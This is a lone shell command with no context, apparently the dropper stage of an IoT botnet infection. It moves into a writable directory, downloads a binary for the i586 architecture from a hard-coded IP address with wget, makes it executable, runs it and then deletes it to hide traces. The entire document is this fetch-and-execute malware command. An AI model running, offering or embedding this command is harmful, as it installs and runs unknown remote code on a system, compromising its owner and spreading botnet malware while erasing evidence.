cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.249.52.21/i586.fdfdsvgb; chmod +x i586.fdfdsvgb; ./i586.fdfdsvgb; rm -rf i586.fdfdsvgb
